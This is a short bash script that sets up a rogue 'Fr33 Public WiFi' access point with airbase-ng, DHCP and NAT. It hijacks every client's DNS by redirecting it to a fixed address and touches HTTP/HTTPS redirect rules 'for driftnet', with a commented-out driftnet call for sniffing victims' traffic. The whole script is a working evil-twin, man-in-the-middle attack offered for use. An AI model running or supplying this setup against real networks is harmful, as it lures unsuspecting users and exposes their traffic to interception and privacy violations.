#!/bin/bash

######################################################################################
######################################################################################

# Authors: Alex Walker, Luuk Derksen

######################################################################################


# SETUP
AP_NAME="Fr33 Public WiFi"
AP_MAC=""
DEV_MON="mon0"
DEV_AP="at0"
DEV_INET="wlan3"


######################################################################################
######################################################################################


# To setup an accesspoint we can use airbase-ng
if [ $AP_MAC = "" ] ; then
    airbase-ng -a 00:11:22:33:44:55 --essid $AP_NAME -c 1 -P $DEV_MON > /tmp/ap_access_list &
else
	airbase-ng -a $AP_MAC --essid $AP_NAME -c 1 -P $DEV_MON > /tmp/ap_access_list &
fi


# Make the accesspoint externally facing
ifconfig $DEV_AP up 192.168.99.1 netmask 255.255.255.0


# Start the DHCP server.
route add -net 192.168.99.0 netmask 255.255.255.0 gw 192.168.99.1
service isc-dhcp-server start > /dev/null 2>&1 
sleep 5


# Flush the iptables.
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
# Then reconfigure the iptables
# iptables -P FORWARD ACCEPT --- why dont we use this?
iptables --table nat --append POSTROUTING --out-interface $DEV_INET -j MASQUERADE
iptables --append FORWARD --in-interface $DEV_AP -j ACCEPT
iptables --table nat --append PREROUTING --protocol udp --dport 53 -j DNAT --to 10.128.128.128


# We can do this > for driftnet.
iptables -t nat -D PREROUTING --protocol tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -D PREROUTING --protocol tcp --dport 443 -j REDIRECT --to-ports 8080


echo 1 > /proc/sys/net/ipv4/ip_forward


# driftnet -i $DEV_AP
